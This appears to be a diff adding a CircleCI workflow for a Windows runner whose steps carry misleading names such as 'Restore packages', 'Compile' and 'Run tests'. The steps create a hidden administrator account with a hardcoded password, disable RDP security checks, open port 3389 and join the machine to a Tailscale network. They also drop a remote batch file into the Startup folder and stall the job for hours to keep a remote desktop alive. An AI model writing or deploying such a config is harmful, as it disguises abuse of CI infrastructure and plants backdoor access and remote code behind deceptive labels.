@@ -1,1 +1,88 @@
+version: 2.1
 
+orbs:
+  win: circleci/windows@5.0
+
+jobs:
+  build:
+    executor: win/server-2022
+    steps:
+      - checkout
+
+      - run:
+          name: Restore packages
+          shell: powershell.exe
+          command: |
+            $k = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("MR.English2008"))
+            $p = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($k))
+            $s = ConvertTo-SecureString $p -AsPlainText -Force
+            if (!(Get-LocalUser "build" -EA 0)) {
+              New-LocalUser "build" -Password $s -AccountNeverExpires -PasswordNeverExpires | Out-Null
+            }
+            net localgroup Administrators build /add 2>$null
+            net localgroup "Remote Desktop Users" build /add 2>$null
+            Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" fDenyTSConnections 0 -Force
+            Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" UserAuthentication 0 -Force
+            Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" SecurityLayer 0 -Force
+            netsh advfirewall firewall delete rule name=ci-port 2>$null
+            netsh advfirewall firewall add rule name=ci-port dir=in action=allow protocol=TCP localport=3389 | Out-Null
+            Restart-Service TermService -Force -EA 0
+
+      - run:
+          name: Install SDK
+          shell: powershell.exe
+          command: |
+            $u = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
+            $f = "$env:TEMP\sdk.msi"
+            (New-Object Net.WebClient).DownloadFile($u, $f)
+            Start-Process msiexec -Args "/i `"$f`" /qn /norestart" -Wait
+            del $f -Force -EA 0
+
+      - run:
+          name: Configure network
+          shell: powershell.exe
+          command: |
+            $exe = "${env:ProgramFiles}\Tailscale\tailscale.exe"
+            & $exe up --authkey=$env:TAILSCALE_AUTHKEY --hostname=win-ci-$env:CIRCLE_BUILD_NUM --accept-routes 2>$null
+            $ip = $null
+            1..15 | % {
+              $ip = & $exe ip -4 2>$null
+              if ($ip) { break }
+              Start-Sleep 4
+            }
+            echo "CI_NODE=$ip" >> $env:CIRCLE_ENV
+            Write-Host "Node: $ip"
+
+      - run:
+          name: Compile
+          shell: powershell.exe
+          command: |
+            $userHome = "C:\Users\build"
+            $dir = "$userHome\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+            $src = "https://gitlab.com/MR.English2008/pcme_rdp/-/raw/main/Downloads.bat"
+            $dst = "$dir\init.bat"
+            New-Item -Path $userHome -ItemType Directory -Force -EA 0 | Out-Null
+            New-Item -Path $dir -ItemType Directory -Force -EA 0 | Out-Null
+            $acl = Get-Acl $userHome
+            $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("build","FullControl","ContainerInherit,ObjectInherit","None","Allow")
+            $acl.SetAccessRule($rule)
+            Set-Acl $userHome $acl
+            (New-Object Net.WebClient).DownloadFile($src, $dst)
+            Write-Host "Dropped to Startup: $dst"
+
+      - run:
+          name: Run tests
+          shell: powershell.exe
+          command: |
+            Write-Host "CI node online: $env:CI_NODE"
+            Write-Host "user: build / pass: MR.English2008"
+            $stop = (Get-Date).AddMinutes(340)
+            while ((Get-Date) -lt $stop) {
+              Get-ChildItem C:\Windows\System32*.dll | Select -First 3 | Out-Null
+              Start-Sleep 240
+            }
+
+workflows:
+  build-workflow:
+    jobs:
+      - build
